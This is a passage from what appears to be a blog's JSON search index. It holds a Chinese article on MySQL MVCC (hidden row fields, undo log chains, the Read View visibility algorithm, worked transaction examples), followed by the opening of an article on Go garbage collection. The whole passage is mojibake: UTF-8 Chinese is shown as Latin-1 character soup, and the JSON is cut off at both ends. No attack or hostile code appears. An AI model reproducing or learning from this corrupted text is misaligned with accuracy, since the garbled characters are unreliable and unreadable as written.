/>\n\nè¡¨2é¡ºåºä¸­ï¼Œäº‹åŠ¡Båœ¨äº‹åŠ¡Aæäº¤åçš„å¿«ç…§è¯»å’Œå½“å‰è¯»éƒ½æ˜¯å®æ—¶çš„æ–°æ•°æ®400ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆå‘¢ï¼Ÿ\n\nè¿™é‡Œä¸ä¸Šè¡¨çš„å”¯ä¸€åŒºåˆ«ä»…ä»…æ˜¯è¡¨1çš„äº‹åŠ¡Båœ¨äº‹åŠ¡Aä¿®æ”¹é‡‘é¢å‰å¿«ç…§è¯»è¿‡ä¸€æ¬¡é‡‘é¢æ•°æ®ï¼Œè€Œè¡¨2çš„äº‹åŠ¡Båœ¨äº‹åŠ¡Aä¿®æ”¹é‡‘é¢å‰æ²¡æœ‰è¿›è¡Œè¿‡å¿«ç…§è¯»ã€‚\n\næ‰€ä»¥æˆ‘ä»¬çŸ¥é“äº‹åŠ¡ä¸­å¿«ç…§è¯»çš„ç»“æœæ˜¯éå¸¸ä¾èµ–è¯¥äº‹åŠ¡é¦–æ¬¡å‡ºç°å¿«ç…§è¯»çš„åœ°æ–¹ï¼Œå³æŸä¸ªäº‹åŠ¡ä¸­é¦–æ¬¡å‡ºç°å¿«ç…§è¯»çš„åœ°æ–¹éå¸¸å…³é”®ï¼Œå®ƒæœ‰å†³å®šè¯¥äº‹åŠ¡åç»­å¿«ç…§è¯»ç»“æœçš„èƒ½åŠ›ã€‚\n\næˆ‘ä»¬è¿™é‡Œæµ‹è¯•çš„æ˜¯æ›´æ–°ï¼ŒåŒæ—¶åˆ é™¤å’Œæ›´æ–°ä¹Ÿæ˜¯ä¸€æ ·çš„ï¼Œå¦‚æœäº‹åŠ¡Bçš„å¿«ç…§è¯»æ˜¯åœ¨äº‹åŠ¡Aæ“ä½œä¹‹åè¿›è¡Œçš„ï¼Œäº‹åŠ¡Bçš„å¿«ç…§è¯»ä¹Ÿæ˜¯èƒ½è¯»å–åˆ°æœ€æ–°çš„æ•°æ®çš„\n\n\n\n### 2.6 å¿«ç…§è¯»å’ŒMVCCçš„å…³ç³»\n\nMVCCå¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶æŒ‡çš„æ˜¯ â€œç»´æŒä¸€ä¸ªæ•°æ®çš„å¤šä¸ªç‰ˆæœ¬ï¼Œä½¿å¾—è¯»å†™æ“ä½œæ²¡æœ‰å†²çªâ€ è¿™ä¹ˆä¸€ä¸ªæ¦‚å¿µã€‚ä»…ä»…æ˜¯ä¸€ä¸ªç†æƒ³æ¦‚å¿µã€‚\n\nè€Œåœ¨MySQLä¸­ï¼Œå®ç°è¿™ä¹ˆä¸€ä¸ªMVCCç†æƒ³æ¦‚å¿µï¼Œæˆ‘ä»¬å°±éœ€è¦MySQLæä¾›å…·ä½“çš„åŠŸèƒ½å»å®ç°å®ƒï¼Œè€Œå¿«ç…§è¯»å°±æ˜¯MySQLä¸ºæˆ‘ä»¬å®ç°MVCCç†æƒ³æ¨¡å‹çš„å…¶ä¸­ä¸€ä¸ªå…·ä½“éé˜»å¡è¯»åŠŸèƒ½ã€‚è€Œç›¸å¯¹è€Œè¨€ï¼Œå½“å‰è¯»å°±æ˜¯æ‚²è§‚é”çš„å…·ä½“åŠŸèƒ½å®ç°ã€‚\n\nè¦è¯´çš„å†ç»†è‡´ä¸€äº›ï¼Œå¿«ç…§è¯»æœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªæŠ½è±¡æ¦‚å¿µï¼Œå†æ·±å…¥ç ”ç©¶ã€‚MVCCæ¨¡å‹åœ¨MySQLä¸­çš„å…·ä½“å®ç°åˆ™æ˜¯ç”± 4ä¸ªéšå¼å­—æ®µï¼Œundoæ—¥å¿—ï¼ŒRead View ç­‰å»å®Œæˆçš„ã€‚\n\n> å¤´è„‘é£æš´ï¼šmvccæ˜¯ä¸€ä¸ªæ¦‚å¿µï¼Œå¿«ç…§è¯»æ˜¯ä¸ºäº†å®ç°å®ƒã€‚\n\n\n\n# 3. å®ç°\n\nMVCCçš„ç›®çš„å°±æ˜¯å¤šç‰ˆæœ¬å¹¶å‘æ§åˆ¶ï¼Œåœ¨æ•°æ®åº“ä¸­çš„å®ç°ï¼Œå°±æ˜¯ä¸ºäº†è§£å†³è¯»å†™å†²çªï¼Œå®ƒçš„å®ç°åŸç†ä¸»è¦æ˜¯ä¾èµ–è®°å½•ä¸­çš„ **4ä¸ªéšå¼å­—æ®µï¼Œundoæ—¥å¿— ï¼ŒRead View æ¥å®ç°çš„ã€‚**\n\n### 3.1 éšè—å­—æ®µ\n\nInnoDBå­˜å‚¨å¼•æ“åœ¨æ¯è¡Œæ•°æ®çš„åé¢æ·»åŠ äº†éšè—å­—æ®µï¼š\n\n+ DB_ROW_ID 6byte, éšå«çš„è‡ªå¢IDï¼ˆéšè—ä¸»é”®ï¼‰ï¼Œå¦‚æœæ•°æ®è¡¨æ²¡æœ‰ä¸»é”®ï¼ŒInnoDBä¼šè‡ªåŠ¨ä»¥DB_ROW_IDäº§ç”Ÿä¸€ä¸ªèšç°‡ç´¢å¼•ã€‚(è¿™ä¸ªDB_ROW_IDè·ŸMVCCå…³ç³»ä¸å¤§)ã€‚\n+ DB_TRX_ID 6byte, æœ€è¿‘ä¿®æ”¹(ä¿®æ”¹/æ’å…¥)äº‹åŠ¡IDï¼šè®°å½•åˆ›å»ºè¿™æ¡è®°å½•/æœ€åä¸€æ¬¡ä¿®æ”¹è¯¥è®°å½•çš„äº‹åŠ¡IDã€‚\n+ DB_ROLL_PTR 7byte, å›æ»šæŒ‡é’ˆï¼ŒæŒ‡å‘è¿™æ¡è®°å½•çš„ä¸Šä¸€ä¸ªç‰ˆæœ¬ï¼ˆå­˜å‚¨äºrollback segmenté‡Œï¼‰ã€‚\n\n+ DELETED_BIT 1byte, è®°å½•è¢«æ›´æ–°æˆ–åˆ é™¤å¹¶ä¸ä»£è¡¨çœŸçš„åˆ é™¤ï¼Œè€Œæ˜¯åˆ é™¤flagå˜äº†\n\n<img src=\"mysqlçš„mvccå®ç°åŸç†/image-20230830133933752.png\" alt=\"image-20230830133933752\" style=\"zoom:50%;\" />\n\nå¦‚ä¸Šå›¾ï¼ŒDB_ROW_IDæ˜¯æ•°æ®åº“é»˜è®¤ä¸ºè¯¥è¡Œè®°å½•ç”Ÿæˆçš„å”¯ä¸€éšå¼ä¸»é”®ï¼›DB_TRX_IDæ˜¯å½“å‰æ“ä½œè¯¥è®°å½•çš„äº‹åŠ¡IDï¼› è€ŒDB_ROLL_PTRæ˜¯ä¸€ä¸ªå›æ»šæŒ‡é’ˆï¼Œç”¨äºé…åˆundoæ—¥å¿—ï¼ŒæŒ‡å‘ä¸Šä¸€ä¸ªæ—§ç‰ˆæœ¬ï¼›delete flagæ²¡æœ‰å±•ç¤ºå‡ºæ¥ã€‚\n\n### 3.2 undo log    \n\nInnoDBæŠŠè¿™äº›ä¸ºäº†å›æ»šè€Œè®°å½•çš„è¿™äº›ä¸œè¥¿ç§°ä¹‹ä¸ºundo logã€‚è¿™é‡Œéœ€è¦æ³¨æ„çš„ä¸€ç‚¹æ˜¯ï¼Œç”±äºæŸ¥è¯¢æ“ä½œï¼ˆSELECTï¼‰å¹¶ä¸ä¼šä¿®æ”¹ä»»ä½•ç”¨æˆ·è®°å½•ï¼Œæ‰€ä»¥åœ¨æŸ¥è¯¢æ“ä½œæ‰§è¡Œæ—¶ï¼Œå¹¶ä¸éœ€è¦è®°å½•ç›¸åº”çš„undo logã€‚undo logä¸»è¦åˆ†ä¸º3ç§ã€‚\n\n+ Insert undo log ï¼šæ’å…¥ä¸€æ¡è®°å½•æ—¶ï¼Œè‡³å°‘è¦æŠŠè¿™æ¡è®°å½•çš„ä¸»é”®å€¼è®°ä¸‹æ¥ï¼Œä¹‹åå›æ»šçš„æ—¶å€™åªéœ€è¦æŠŠè¿™ä¸ªä¸»é”®å€¼å¯¹åº”çš„è®°å½•åˆ æ‰å°±å¥½äº†ã€‚\n\n+ Update undo logï¼šä¿®æ”¹ä¸€æ¡è®°å½•æ—¶ï¼Œè‡³å°‘è¦æŠŠä¿®æ”¹è¿™æ¡è®°å½•å‰çš„æ—§å€¼éƒ½è®°å½•ä¸‹æ¥ï¼Œè¿™æ ·ä¹‹åå›æ»šæ—¶å†æŠŠè¿™æ¡è®°å½•æ›´æ–°ä¸ºæ—§å€¼å°±å¥½äº†ã€‚\n\n+ Delete undo logï¼šåˆ é™¤ä¸€æ¡è®°å½•æ—¶ï¼Œè‡³å°‘è¦æŠŠè¿™æ¡è®°å½•ä¸­çš„å†…å®¹éƒ½è®°ä¸‹æ¥ï¼Œè¿™æ ·ä¹‹åå›æ»šæ—¶å†æŠŠç”±è¿™äº›å†…å®¹ç»„æˆçš„è®°å½•æ’å…¥åˆ°è¡¨ä¸­å°±å¥½äº†ã€‚\n\n\n\nåˆ é™¤æ“ä½œéƒ½åªæ˜¯è®¾ç½®ä¸€ä¸‹è€è®°å½•çš„DELETED_BITï¼Œå¹¶ä¸çœŸæ­£å°†è¿‡æ—¶çš„è®°å½•åˆ é™¤ã€‚\n\nä¸ºäº†èŠ‚çœç£ç›˜ç©ºé—´ï¼ŒInnoDBæœ‰ä¸“é—¨çš„purgeçº¿ç¨‹æ¥æ¸…ç†DELETED_BITä¸ºtrueçš„è®°å½•ã€‚ä¸ºäº†ä¸å½±å“MVCCçš„æ­£å¸¸å·¥ä½œï¼Œpurgeçº¿ç¨‹è‡ªå·±ä¹Ÿç»´æŠ¤äº†ä¸€ä¸ªread viewï¼ˆè¿™ä¸ªread viewç›¸å½“äºç³»ç»Ÿä¸­æœ€è€æ´»è·ƒäº‹åŠ¡çš„read viewï¼‰;å¦‚æœæŸä¸ªè®°å½•çš„DELETED_BITä¸ºtrueï¼Œå¹¶ä¸”DB_TRX_IDç›¸å¯¹äºpurgeçº¿ç¨‹çš„read viewå¯è§ï¼Œé‚£ä¹ˆè¿™æ¡è®°å½•ä¸€å®šæ˜¯å¯ä»¥è¢«å®‰å…¨æ¸…é™¤çš„ã€‚\n\n\n\n### 3.3 undo log é“¾\n\n**1. æ’å…¥**\n\næ¯”å¦‚ä¸€ä¸ªæœ‰ä¸ªäº‹åŠ¡æ’å…¥persionè¡¨æ’å…¥äº†ä¸€æ¡æ–°è®°å½•ï¼Œè®°å½•å¦‚ä¸‹ï¼Œnameä¸ºJerry, ageä¸º24å²ï¼Œéšå¼ä¸»é”®æ˜¯1ï¼Œäº‹åŠ¡IDå’Œå›æ»šæŒ‡é’ˆï¼Œæˆ‘ä»¬å‡è®¾ä¸ºNULL\n\n<img src=\"mysqlçš„mvccå®ç°åŸç†/image-20230830134355265.png\" alt=\"image-20230830134355265\" style=\"zoom:40%;\" />\n\n**2. ä¿®æ”¹1**\n\nç°åœ¨æ¥äº†ä¸€ä¸ªäº‹åŠ¡1å¯¹è¯¥è®°å½•çš„nameåšå‡ºäº†ä¿®æ”¹ï¼Œæ”¹ä¸ºTom\n\n<img src=\"mysqlçš„mvccå®ç°åŸç†/image-20230830134456119.png\" alt=\"image-20230830134456119\" style=\"zoom:40%;\" />\n\n+ åœ¨äº‹åŠ¡1ä¿®æ”¹è¯¥è¡Œ(è®°å½•)æ•°æ®æ—¶ï¼Œæ•°æ®åº“ä¼šå…ˆå¯¹è¯¥è¡ŒåŠ æ’ä»–é”\n\n+ ç„¶åæŠŠè¯¥è¡Œæ•°æ®æ‹·è´åˆ°undo logä¸­ï¼Œä½œä¸ºæ—§è®°å½•ï¼Œå³åœ¨undo logä¸­æœ‰å½“å‰è¡Œçš„æ‹·è´å‰¯æœ¬\n\n+ æ‹·è´å®Œæ¯•åï¼Œä¿®æ”¹è¯¥è¡Œnameä¸ºTomï¼Œå¹¶ä¸”ä¿®æ”¹éšè—å­—æ®µçš„äº‹åŠ¡IDä¸ºå½“å‰äº‹åŠ¡1çš„ID, æˆ‘ä»¬é»˜è®¤ä»1å¼€å§‹ï¼Œä¹‹åé€’å¢ï¼Œå›æ»šæŒ‡é’ˆæŒ‡å‘æ‹·è´åˆ°undo logçš„å‰¯æœ¬è®°å½•ï¼Œå³è¡¨ç¤ºæˆ‘çš„ä¸Šä¸€ä¸ªç‰ˆæœ¬å°±æ˜¯å®ƒã€‚\n\n+ äº‹åŠ¡æäº¤åï¼Œé‡Šæ”¾é”\n\n**3.  ä¿®æ”¹2**\n\nåˆæ¥äº†ä¸ªäº‹åŠ¡2ä¿®æ”¹personè¡¨çš„åŒä¸€ä¸ªè®°å½•ï¼Œå°†ageä¿®æ”¹ä¸º30å²\n\n<img src=\"mysqlçš„mvccå®ç°åŸç†/image-20230830134628379.png\" alt=\"image-20230830134628379\" style=\"zoom:40%;\" />\n\n+ åœ¨äº‹åŠ¡2ä¿®æ”¹è¯¥è¡Œæ•°æ®æ—¶ï¼Œæ•°æ®åº“ä¹Ÿå…ˆä¸ºè¯¥è¡ŒåŠ é”\n+ ç„¶åæŠŠè¯¥è¡Œæ•°æ®æ‹·è´åˆ°undo logä¸­ï¼Œä½œä¸ºæ—§è®°å½•ï¼Œå‘ç°è¯¥è¡Œè®°å½•å·²ç»æœ‰undo logäº†ï¼Œé‚£ä¹ˆæœ€æ–°çš„æ—§æ•°æ®ä½œä¸ºé“¾è¡¨çš„è¡¨å¤´ï¼Œæ’åœ¨è¯¥è¡Œè®°å½•çš„undo logæœ€å‰é¢\n+ ä¿®æ”¹è¯¥è¡Œageä¸º30å²ï¼Œå¹¶ä¸”ä¿®æ”¹éšè—å­—æ®µçš„äº‹åŠ¡IDä¸ºå½“å‰äº‹åŠ¡2çš„ID, é‚£å°±æ˜¯2ï¼Œå›æ»šæŒ‡é’ˆæŒ‡å‘åˆšåˆšæ‹·è´åˆ°undo logçš„å‰¯æœ¬è®°å½•\n+ äº‹åŠ¡æäº¤ï¼Œé‡Šæ”¾é”ã€‚\n\n\n\nä»ä¸Šé¢ï¼Œæˆ‘ä»¬å°±å¯ä»¥çœ‹å‡ºï¼Œä¸åŒäº‹åŠ¡æˆ–è€…ç›¸åŒäº‹åŠ¡çš„å¯¹åŒä¸€è®°å½•çš„ä¿®æ”¹ï¼Œä¼šå¯¼è‡´è¯¥è®°å½•çš„undo logæˆä¸ºä¸€æ¡è®°å½•ç‰ˆæœ¬çº¿æ€§è¡¨ï¼Œå³é“¾è¡¨ï¼Œundo logçš„é“¾é¦–å°±æ˜¯æœ€æ–°çš„æ—§è®°å½•ï¼Œé“¾å°¾å°±æ˜¯æœ€æ—©çš„æ—§è®°å½•ã€‚ï¼ˆå½“ç„¶å°±åƒä¹‹å‰è¯´çš„è¯¥undo logçš„èŠ‚ç‚¹å¯èƒ½æ˜¯ä¼špurgeçº¿ç¨‹æ¸…é™¤æ‰ï¼Œå‘å›¾ä¸­çš„ç¬¬ä¸€æ¡insert undo logï¼Œå…¶å®åœ¨äº‹åŠ¡æäº¤ä¹‹åå¯èƒ½å°±è¢«åˆ é™¤ä¸¢å¤±äº†ï¼Œä¸è¿‡è¿™é‡Œä¸ºäº†æ¼”ç¤ºï¼Œæ‰€ä»¥è¿˜æ”¾åœ¨è¿™é‡Œï¼‰\n\n### 3.4 Read View\n\næ‰§è¡ŒSelect è¯­å¥æ—¶ï¼Œå¯¹è¯¥è®°å½•åˆ›å»ºä¸€ä¸ªRead Viewè¯»è§†å›¾ï¼ŒæŠŠå®ƒæ¯”ä½œæ¡ä»¶ç”¨æ¥åˆ¤æ–­å½“å‰äº‹åŠ¡èƒ½å¤Ÿçœ‹åˆ°å“ªä¸ªç‰ˆæœ¬çš„æ•°æ®ï¼Œå³å¯èƒ½æ˜¯å½“å‰æœ€æ–°çš„æ•°æ®ï¼Œä¹Ÿæœ‰å¯èƒ½æ˜¯è¯¥è¡Œè®°å½•çš„undo logé‡Œé¢çš„æŸä¸ªç‰ˆæœ¬çš„æ•°æ®ã€‚\n\n\n\nRead Viewéµå¾ªä¸€ä¸ªå¯è§æ€§ç®—æ³•ï¼Œä¸»è¦æ˜¯å°†è¦è¢«ä¿®æ”¹çš„æ•°æ®çš„æœ€æ–°è®°å½•ä¸­çš„ DB_TRX_IDï¼ˆå³å½“å‰äº‹åŠ¡IDï¼‰å–å‡ºæ¥ï¼Œä¸ç³»ç»Ÿå½“å‰å…¶ä»–æ´»è·ƒäº‹åŠ¡çš„IDå»å¯¹æ¯”ï¼ˆç”±Read Viewç»´æŠ¤ï¼‰ï¼Œå¦‚æœDB_TRX_IDè·ŸRead Viewçš„å±æ€§åšäº†æŸäº›æ¯”è¾ƒï¼Œä¸ç¬¦åˆå¯è§æ€§ï¼Œé‚£å°±é€šè¿‡DB_ROLL_PTRå›æ»šæŒ‡é’ˆå»å–å‡ºUndo Logä¸­çš„DB_TRX_IDå†æ¯”è¾ƒï¼Œå³éå†é“¾è¡¨çš„DB_TRX_IDï¼ˆä»é“¾é¦–åˆ°é“¾å°¾ï¼Œå³ä»æœ€è¿‘çš„ä¸€æ¬¡ä¿®æ”¹æŸ¥èµ·ï¼‰ï¼Œç›´åˆ°æ‰¾åˆ°æ»¡è¶³ç‰¹å®šæ¡ä»¶çš„DB_TRX_ID, é‚£ä¹ˆè¿™ä¸ªDB_TRX_IDæ‰€åœ¨çš„æ—§è®°å½•å°±æ˜¯å½“å‰äº‹åŠ¡èƒ½çœ‹è§çš„æœ€æ–°è€ç‰ˆæœ¬ã€‚\n\n**Read View ç®—æ³•**\n\næˆ‘ä»¬å¯ä»¥æŠŠRead Viewç®€å•çš„ç†è§£æˆæœ‰ä¸‰ä¸ªå…¨å±€å±æ€§\n\n+ trx_list æœªæäº¤äº‹åŠ¡IDåˆ—è¡¨ï¼Œç”¨æ¥ç»´æŠ¤Read Viewç”Ÿæˆæ—¶åˆ»ç³»ç»Ÿæ­£æ´»è·ƒçš„äº‹åŠ¡ID\n\n+ up_limit_id è®°å½•trx_liståˆ—è¡¨ä¸­äº‹åŠ¡æœ€å°çš„ID\n\n+ low_limit_id ReadViewç”Ÿæˆæ—¶åˆ»ç³»ç»Ÿå°šæœªåˆ†é…çš„ä¸‹ä¸€ä¸ªäº‹åŠ¡IDï¼Œä¹Ÿå°±æ˜¯ç›®å‰å·²å‡ºç°è¿‡çš„äº‹åŠ¡IDçš„æœ€å¤§å€¼+1\n\n\n\n```bash\n1. å¦‚æœ DB_TRX_ID < up_limit_id, é‚£ä¹ˆè¡¨æ˜æœ€æ–°ä¿®æ”¹è¯¥è¡Œçš„äº‹åŠ¡åœ¨å½“å‰äº‹åŠ¡åˆ›å»ºå¿«ç…§ä¹‹å‰å°±æäº¤äº†ï¼Œæ‰€ä»¥è¯¥è®°å½•è¡Œçš„å€¼å¯¹å½“å‰äº‹åŠ¡æ˜¯å¯è§çš„ã€‚è·³åˆ°æ­¥éª¤5ã€‚\n\n2. å¦‚æœ DB_TRX_ID >= low_limit_id, é‚£ä¹ˆè¡¨æ˜æœ€æ–°ä¿®æ”¹è¯¥è¡Œçš„äº‹åŠ¡åœ¨å½“å‰äº‹åŠ¡åˆ›å»ºå¿«ç…§ä¹‹åæ‰ä¿®æ”¹è¯¥è¡Œï¼Œæ‰€ä»¥è¯¥è®°å½•è¡Œçš„å€¼å¯¹å½“å‰äº‹åŠ¡ä¸å¯è§ã€‚è·³åˆ°æ­¥éª¤4ã€‚\n\n3. å¦‚æœ up_limit_id <= DB_TRX_ID < low_limit_id, è¡¨æ˜æœ€æ–°ä¿®æ”¹è¯¥è¡Œçš„äº‹åŠ¡åœ¨å½“å‰äº‹åŠ¡åˆ›å»ºå¿«ç…§çš„æ—¶å€™å¯èƒ½å¤„äºâ€œæ´»åŠ¨çŠ¶æ€â€æˆ–è€…â€œå·²æäº¤çŠ¶æ€â€ï¼›æ‰€ä»¥å°±è¦å¯¹æ´»è·ƒäº‹åŠ¡åˆ—è¡¨trx_idsè¿›è¡ŒæŸ¥æ‰¾ï¼ˆæºç ä¸­æ˜¯ç”¨çš„äºŒåˆ†æŸ¥æ‰¾ï¼Œå› ä¸ºæ˜¯æœ‰åºçš„ï¼‰ï¼š\n\n  3.1 å¦‚æœåœ¨æ´»è·ƒäº‹åŠ¡åˆ—è¡¨trx_idsä¸­èƒ½æ‰¾åˆ° id ä¸º DB_TRX_ID çš„äº‹åŠ¡ï¼Œè¡¨æ˜â‘ åœ¨å½“å‰äº‹åŠ¡åˆ›å»ºå¿«ç…§å‰ï¼Œè¯¥è®°å½•è¡Œçš„å€¼è¢«idä¸ºtrx_idçš„äº‹åŠ¡ä¿®æ”¹äº†ï¼Œä½†æ²¡æœ‰æäº¤ï¼›æˆ–è€…â‘¡åœ¨å½“å‰äº‹åŠ¡åˆ›å»ºå¿«ç…§åï¼Œè¯¥è®°å½•è¡Œçš„å€¼è¢«idä¸ºtrx_idçš„äº‹åŠ¡ä¿®æ”¹äº†ï¼ˆä¸ç®¡æœ‰æ— æäº¤ï¼‰ï¼›è¿™äº›æƒ…å†µä¸‹ï¼Œè¿™ä¸ªè®°å½•è¡Œçš„å€¼å¯¹å½“å‰äº‹åŠ¡éƒ½æ˜¯ä¸å¯è§çš„ï¼Œè·³åˆ°æ­¥éª¤4ï¼›\n\n  3.2 åœ¨æ´»è·ƒäº‹åŠ¡åˆ—è¡¨ä¸­æ‰¾ä¸åˆ°ï¼Œåˆ™è¡¨æ˜idä¸º DB_TRX_ID çš„äº‹åŠ¡åœ¨ä¿®æ”¹è¯¥è®°å½•è¡Œçš„å€¼åï¼Œåœ¨å½“å‰äº‹åŠ¡åˆ›å»ºå¿«ç…§å‰å°±å·²ç»æäº¤äº†ï¼Œæ‰€ä»¥è®°å½•è¡Œå¯¹å½“å‰äº‹åŠ¡å¯è§ï¼Œè·³åˆ°æ­¥éª¤5ã€‚\n\n4. åœ¨è¯¥è®°å½•è¡Œçš„ DB_ROLL_PTR æŒ‡é’ˆæ‰€æŒ‡å‘çš„undo logå›æ»šæ®µä¸­ï¼Œå–å‡ºæœ€æ–°çš„çš„æ—§äº‹åŠ¡å·DB_TRX_ID, å°†å®ƒèµ‹ç»™trx_idï¼Œç„¶åè·³åˆ°æ­¥éª¤1é‡æ–°å¼€å§‹åˆ¤æ–­ã€‚\n\n5. å°†è¯¥å¯è§è¡Œçš„å€¼è¿”å›ã€‚\n```\n\n\n\n### 3.5 æ•´ä½“æµç¨‹\n\n|          |                |          |              |\n| -------- | -------------- | -------- | ------------ |\n| äº‹åŠ¡1    | äº‹åŠ¡2          | äº‹åŠ¡3    | äº‹åŠ¡4        |\n| äº‹åŠ¡å¼€å§‹ | äº‹åŠ¡å¼€å§‹       | äº‹åŠ¡å¼€å§‹ | äº‹åŠ¡å¼€å§‹     |\n| â€¦        | â€¦              | â€¦        | ä¿®æ”¹ä¸”å·²æäº¤ |\n| è¿›è¡Œä¸­   | **å¼€å§‹å¿«ç…§è¯»** | è¿›è¡Œä¸­   |              |\n| â€¦        | â€¦              | â€¦        |              |\n\n<img src=\"mysqlçš„mvccå®ç°åŸç†/image-20230830135842844.png\" alt=\"image-20230830135842844\" style=\"zoom:40%;\" />\n\nå½“äº‹åŠ¡2å¯¹æŸè¡Œæ•°æ®æ‰§è¡Œäº†å¿«ç…§è¯»ï¼Œæ•°æ®åº“ä¸ºè¯¥è¡Œæ•°æ®ç”Ÿæˆä¸€ä¸ªRead Viewè¯»è§†å›¾ï¼Œå‡è®¾å½“å‰äº‹åŠ¡IDä¸º2ï¼Œæ­¤æ—¶è¿˜æœ‰äº‹åŠ¡1å’Œäº‹åŠ¡3åœ¨æ´»è·ƒä¸­ï¼Œäº‹åŠ¡4åœ¨äº‹åŠ¡2å¿«ç…§è¯»å‰ä¸€åˆ»æäº¤æ›´æ–°äº†ï¼Œæ‰€ä»¥Read Viewè®°å½•äº†ç³»ç»Ÿå½“å‰æ´»è·ƒäº‹åŠ¡1ï¼Œ3çš„IDï¼Œç»´æŠ¤åœ¨ä¸€ä¸ªåˆ—è¡¨ä¸Šï¼Œæˆ‘ä»¬ç§°ä¸ºtrx_listã€‚\n\næˆ‘ä»¬çš„ä¾‹å­ä¸­ï¼Œåªæœ‰äº‹åŠ¡4ä¿®æ”¹è¿‡è¯¥è¡Œè®°å½•ï¼Œå¹¶åœ¨äº‹åŠ¡2æ‰§è¡Œå¿«ç…§è¯»å‰ï¼Œå°±æäº¤äº†äº‹åŠ¡ï¼Œæ‰€ä»¥å½“å‰è¯¥è¡Œå½“å‰æ•°æ®çš„undo logå¦‚ä¸‹å›¾æ‰€ç¤ºï¼›æˆ‘ä»¬çš„äº‹åŠ¡2åœ¨å¿«ç…§è¯»è¯¥è¡Œè®°å½•çš„æ—¶å€™ï¼Œå°±ä¼šæ‹¿è¯¥è¡Œè®°å½•çš„DB_TRX_IDå»è·Ÿup_limit_id,low_limit_idå’Œæ´»è·ƒäº‹åŠ¡IDåˆ—è¡¨(trx_list)è¿›è¡Œæ¯”è¾ƒï¼Œåˆ¤æ–­å½“å‰äº‹åŠ¡2èƒ½çœ‹åˆ°è¯¥è®°å½•çš„ç‰ˆæœ¬æ˜¯å“ªä¸ªã€‚\n\n<img src=\"mysqlçš„mvccå®ç°åŸç†/image-20230830135958846.png\" alt=\"image-20230830135958846\" style=\"zoom:40%;\" />\n\n1. å…ˆæ‹¿è¯¥è®°å½•DB_TRX_IDå­—æ®µè®°å½•çš„äº‹åŠ¡ID 4å»è·ŸRead Viewçš„çš„up_limit_idæ¯”è¾ƒï¼Œçœ‹4æ˜¯å¦å°äºup_limit_idï¼Œä¸ç¬¦åˆæ¡ä»¶ã€‚\n2. ç»§ç»­åˆ¤æ–­ 4 æ˜¯å¦å¤§äºç­‰äº low_limit_id(5)ï¼Œä¹Ÿä¸ç¬¦åˆæ¡ä»¶ã€‚\n3. æœ€ååˆ¤æ–­4æ˜¯å¦å¤„äºtrx_listä¸­çš„æ´»è·ƒäº‹åŠ¡, æœ€åå‘ç°äº‹åŠ¡IDä¸º4çš„äº‹åŠ¡ä¸åœ¨å½“å‰æ´»è·ƒäº‹åŠ¡åˆ—è¡¨ä¸­, ç¬¦åˆå¯è§æ€§æ¡ä»¶ã€‚\n4. æ‰€ä»¥äº‹åŠ¡4ä¿®æ”¹åæäº¤çš„æœ€æ–°ç»“æœå¯¹äº‹åŠ¡2å¿«ç…§è¯»æ—¶æ˜¯å¯è§çš„ï¼Œæ‰€ä»¥äº‹åŠ¡2èƒ½è¯»åˆ°çš„æœ€æ–°æ•°æ®è®°å½•æ˜¯äº‹åŠ¡4æ‰€æäº¤çš„ç‰ˆæœ¬ã€‚\n\n<img src=\"mysqlçš„mvccå®ç°åŸç†/image-20230830140331751.png\" alt=\"image-20230830140331751\" style=\"zoom: 40%;\" />\n\n# 4. å‚è€ƒèµ„æ–™\n\n+ https://zhuanlan.zhihu.com/p/66791480\n+ https://zhuanlan.zhihu.com/p/52977862\n+ https://blog.csdn.net/Waves___/article/details/105295060\n+ https://pdai.tech/md/db/sql-mysql/sql-mysql-mvcc.html\n+ ç´¢å¼• https://www.liuvv.com/p/84544518.html\n- é”å’Œäº‹åŠ¡ https://www.liuvv.com/p/9762ea3e.html\n- MVCC https://www.liuvv.com/p/a0f7945d.html\n","tags":["mysql"],"categories":["mysql"]},{"title":"golangçš„GCåƒåœ¾å›æ”¶","url":"%2Fp%2F26aea798.html","content":"\n# 1. å¸¸è§çš„GCç®—æ³•\n\nGC æ˜¯ä¸€ç§è‡ªåŠ¨ç®¡ç†å†…å­˜çš„æŠ€æœ¯ï¼Œç”¨æ¥å›æ”¶ï¼ˆé‡Šæ”¾ï¼‰ heap ä¸­ä¸å†ä½¿ç”¨çš„å¯¹è±¡ã€‚GC è¿‡ç¨‹ä¸­æ¶‰åŠåˆ°ä¸¤ä¸ªé˜¶æ®µï¼š\n\n1. åŒºåˆ†æ´»å¯¹è±¡ï¼ˆlive objectï¼‰ä¸åƒåœ¾å¯¹è±¡ï¼ˆgarbageï¼‰\n2.  å›æ”¶åƒåœ¾å¯¹è±¡çš„å†…å­˜ï¼Œä½¿å¾—ç¨‹åºå¯ä»¥é‡å¤ä½¿ç”¨è¿™äº›å†…å­˜\n\n<!-- more -->\n\n### 1.1 å¼•ç”¨è®¡æ•°ï¼ˆReference countingï¼‰\n\næ ¹æ®å¯¹è±¡è‡ªèº«çš„å¼•ç”¨è®¡æ•°æ¥å›æ”¶ï¼Œå½“å¼•ç”¨è®¡æ•°å½’é›¶æ—¶è¿›è¡Œå›æ”¶ï¼Œä½†æ˜¯è®¡æ•°é¢‘ç¹æ›´æ–°ä¼šå¸¦æ¥æ›´å¤šå¼€é”€ï¼Œä¸”æ— æ³•è§£å†³å¾ªç¯å¼•ç”¨çš„é—®é¢˜ã€‚\n\n- ä¼˜ç‚¹ï¼šç®€å•ç›´æ¥ï¼Œå›æ”¶é€Ÿåº¦å¿«\n- ç¼ºç‚¹ï¼šéœ€è¦é¢å¤–çš„ç©ºé—´å­˜æ”¾è®¡æ•°ï¼Œæ— æ³•å¤„ç†å¾ªç¯å¼•ç”¨çš„æƒ…å†µï¼›\n\n\n\n### 1.2 è¿½è¸ªæŠ€æœ¯ï¼ˆTracingï¼‰\n\nè¿™æ˜¯ç›®å‰ä½¿ç”¨èŒƒå›´æœ€å¹¿çš„æŠ€æœ¯ï¼Œä¸€èˆ¬æˆ‘ä»¬æåˆ° GC éƒ½æ˜¯æŒ‡è¿™ç±»ã€‚\n\nè¿™ç±» GC ä»æŸäº›è¢«ç§°ä¸º root 